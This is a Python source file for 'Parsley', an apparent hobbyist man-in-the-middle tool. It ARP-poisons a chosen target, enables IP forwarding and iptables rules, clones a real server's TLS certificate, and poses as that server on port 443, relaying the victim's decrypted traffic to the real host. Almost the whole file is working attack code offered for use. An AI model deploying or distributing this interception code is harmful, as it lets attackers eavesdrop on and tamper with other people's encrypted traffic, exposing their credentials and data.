import socket
from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR, IPPROTO_IP

#from http.server import HTTPServer, BaseHTTPRequestHandler
#from socket import * # THIS CAUSE PROBLEMS WHY?
#from socket import SOL_IP, IP_TRANSPARENT
import os
import errno

import netifaces as ni
import threading
import traceback
import ssl
import time
import logging

from argparse import ArgumentParser

import OpenSSL
from OpenSSL import crypto, SSL
from os.path import exists, join
from io import open

from scapy.all import *

from utils import *
from connection import *
from cert import *
import arp_spoof

KEYFILE = 'server_key.pem'
CERTFILE = 'server_cert.pem'
PORT = 443
CONN = 5

version = 0.01
banner="""\n
 ____                _            
|  _ \ __ _ _ __ ___| | ___ _   _ 
| |_) / _` | '__/ __| |/ _ \ | | |
|  __/ (_| | |  \__ \ |  __/ |_| |
|_|   \__,_|_|  |___/_|\___|\__, |
                            |___/ 
	Parsley v{}\n
by:Dan00bie\n\n""".format(version)

# parse command line
def set_configs():
	parser = ArgumentParser()
	#parser.add_argument ( "echo", help="echo the string you use here" )
	#parser.add_argument("-v", "--verbosity", type=int, choices=[0, 1, 2], help="increase output verbosity")
	#parser.add_argument("square", type=int, help="display a square of a given number")

	parser.add_argument ( "-t", "--target", required=True, type=str, help="The target IP" )
	parser.add_argument ( "-s", "--server", required=True, type=str, help="The server IP to spoof" )
	parser.add_argument ( "-i", "--interface", required=True, type=str, help="The interface to use" )

	# parse command line
	args = parser.parse_args()
	'''
	answer = args.square**2
	if args.verbosity == 2:
		print("the square of {} equals {}".format(args.square, answer))
	elif args.verbosity == 1:
		print("{}^2 == {}".format(args.square, answer))
	else:
		print(answer)

	print (args.echo)
	'''
	#print (args)
	# return config dictionary
	conf = { 
		'target' : {
			'ip':args.target,
			'mac':ip_to_mac(args.target,args.interface),
		},
		'server' : {
			'ip':args.server,
			'mac':ip_to_mac(args.server,args.interface),
		},
		'mitm' : {
			'ip': ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr'],
			'mac': ni.ifaddresses(args.interface)[ni.AF_LINK][0]['addr'],
		},
		'interface' : args.interface
	}
	logging.info(conf)
	return conf

def end( configs ):
	logging.info ( "[*] Disabling ip forwarding..." )
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	logging.info ( "[*] Cleaning iptables rules..." )
	iptables_clean()

def start( configs ):
	time.sleep(0.1)
	try:
		print ( banner )
		#print ( version )
		# print ( "Ensure that ARP spoofing is running!" )
		
		logging.info ( "[*] Enabling ip forwarding..." )
		# sysctl -w net.ipv4.ip_forward=1
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

		#print("Sleeping...")
		#time.sleep( 50 )

		#print ( "[*] Checking for iptables rules..." )
		
		logging.info ( "[*] Adding iptables rules..." )
		iptables_accept( configs )

		logging.info ( "[*] Cloning server certificate..." )
		cert = get_cert_from_endpoint ( configs['server']['ip'] )
		#cert = _get_cert_from_endpoint ( "www.google.com" )
		if ( cert != None ): clone_certificate ( cert )

		spoof_server( configs )
		# spoof_gateway( configs )
		
		end( configs )

	except KeyboardInterrupt:
		#print ("\n[!] Ctrl+C: closing program")
		#s.close()
		#f.close()
		end( configs )
		raise
		
	except Exception as e:# Any other error
		logging.error ("\n[!] Error in executing program:", exc_info=True )
		#logging.error (traceback.format_exc())
		end( configs )

		# the socket is open? If yes close it
		
def spoof_server ( configs ):
	try:
		# socket for the mitm, it will fake server and listen for client connections
		s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

		s.bind((configs['mitm']['ip'],PORT))
		
		# ssl_version=ssl.PROTOCOL_SSLv23 ssl.PROTOCOL_TLS
		if ( PORT == 443 ):
			s = ssl.wrap_socket ( s, server_side = True, keyfile=KEYFILE, certfile=CERTFILE, do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
			s.listen(CONN)
		else:
			s.listen(CONN)

		logging.info ("[*] Listening on port {}..".format (PORT) )
		
		while True:
			try:
				# server socket, it opens a communication with real server
				f = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
				
				logging.debug("[*] Connecting to server...")
				if ( PORT == 443 ):
					logging.debug("[*] Doing TLS handshake...")
					f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
					f.connect(( configs['server']['ip'], PORT)) # connecting using 202 source IP
				else:
					f.connect (( configs['server']['ip'], PORT))
				logging.debug("[*] Connection enstablished!")


				#c, addr = s.accept()
				# https://issues.apache.org/jira/browse/THRIFT-4274
				#c, addr = sslsocket.accept()
				c = None
				c, addr = s.accept()

				# ok i have a connection with victim client on secure socket c
				# since victim client is connecting with me i spoofed real server IP so i know the server name, otherwise i spoofed the gateway...
				# if i spoofed the gw i needed to go deep since routers don't use L4 but only L3 ( IP ), basically i can't create a socket SOCK_STREAM and wrap a ssl to it
				# since method itself says that only SOCK_STREAM sockets are supported
				# which means i have finished my tcp and tls handshake with him now he sended me some data to be forwarded to server faking the client requests
				logging.debug ("\n[*] Received connection from: {}".format(addr))

				#handle_connection ( c, wrap_f )
				handle_connection_stream ( c, f )

				# i should be sure the 2 finished communicating
				logging.debug ("[*] Closing connection with client...")
				logging.debug ("[*] Closing connection with server...")
				#wrap_f.close()
				# If how is SHUT_RD, further receives are disallowed. If how is SHUT_WR, further sends are disallowed. If how is SHUT_RDWR, further sends and receives are disallowed.
				f.shutdown( SHUT_RDWR )
				f.close()
				c.shutdown( SHUT_RDWR )
				c.close()

			except socket.error as e:
				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection
				if ( e.errno == 0 ): 
					logging.error ("[!] It seems the client closed the connection! ReListening...")
					#wrap_f.close()
					f.shutdown( SHUT_RDWR )
					f.close()
					continue
				else: # could be connect error, socket creation error or error in handle connection or in shutdown close
					# ssl.SSLError
					logging.error ("\n[!] Error in accepting secure connection from client or server:", exc_info=True )
					#logging.error(traceback.format_exc())
					# print(sys.exc_info()[0]) # ERROR sys not defined python3
					#print ( e )
					logging.error ("Socket error({0}): {1}".format(e.errno, e.strerror))
					logging.error ( os.strerror( e.errno ) )
					end( configs )
					#s.close() # do i need to close wrapped one?
					c.shutdown( SHUT_RDWR )
					c.close()
					s.shutdown( SHUT_RDWR )
					s.close()
					#sslsocket.close()
					break
			except KeyboardInterrupt:
				#sslsocket.close()
				#f.shutdown( SHUT_RDWR )
				f.close()
				#c.shutdown( SHUT_RDWR )
				if ( c != None ): c.close()
				raise
	# disabled promiscuous mode
	# s.ioctl(s.SIO_RCVALL, s.RCVALL_OFF)
	except KeyboardInterrupt:
		#sslsocket.close()
		
		s.close()
		raise

	except socket.error as v: # as python3 --> , python2
		# there could be many different socket errors 
		logging.error ("\n[!] Error in creating mitm socket:", exc_info=True )
		#print ( "errno no: ", v[0] ) # ERROR IN THE ERROR python3
		#logging.error(traceback.format_exc())
		# print(sys.exc_info()[0]) #ERROR sys not defined
		end( configs )

def gateway_forward ( configs ):
	def sniff( packet ):
		print ( "RECEIVED:\n",packet.show() )
		'''
		i received a packet that gateway should have.. I must simple reforward to gw using scapy --> this bypass kernel
		'''
		# change destination mac ----> must recalculate checksum and stuff? I GUESS SO
		packet[Ether].dst = configs['server']['mac']
		print ( "MODIFIED:\n",packet.show() )
		srp1( packet, iface=configs['interface'] ) # send packet at L3 da fuck dus that mean
	return sniff

def spoof_gateway( configs ):

	#command = "iptables -t nat -A PREROUTING -d "+configs['server']['ip']+" -j DNAT --to "+configs['mitm']['ip']
	#os.system( command )
	fil = "tcp and port 443 and src host " + configs['target']['ip']
	print (fil)
	#packet=sniff(iface=configs['interface'],filter=fil, prn=lambda x:x.sprintf("{IP:%IP.src% (%Ether.src%)\t--->\t%IP.dst% (%Ether.dst%):\t%TCP.sport%\t--->\t%TCP.dport%}" ) )
	packet=sniff(iface=configs['interface'],filter=fil, prn=gateway_forward( configs )  )

def main():
	try:
		configs = set_configs()
		#logging.info ( configs['target']['ip'] )
		arp = threading.Thread( target=arp_spoof.poison, args=[ configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['mitm']['mac'] ] )  
		arp.setDaemon(True)
		arp.start() #ARP spoofing
		#time.sleep(10)

		start( configs )
	except KeyboardInterrupt:
		logging.info ("\n[!] Ctrl+C: closing program")
		logging.info ("\n[*] Antitode target..")
		arp_spoof.antitode( configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['server']['mac'] )

if __name__ == '__main__' :
	if os.geteuid() != 0:
		sys.exit("[!] Program must be runned as root! Exiting...")

	# formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
	logging.basicConfig ( level=logging.INFO, format='%(message)s' )
	#logger = logging.getLogger( __name__ )
	#logging.info("tryout")

	'''
	logger = logging.getLogger(__name__)
	logger.setLevel(logging.INFO)

	# create a file handler
	handler = logging.FileHandler('hello.log')
	handler.setLevel(logging.INFO)

	# create a logging format
	formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
	handler.setFormatter(formatter)

	# add the handlers to the logger
	logger.addHandler(handler)

	logger.info('Hello baby')
	'''
	main()
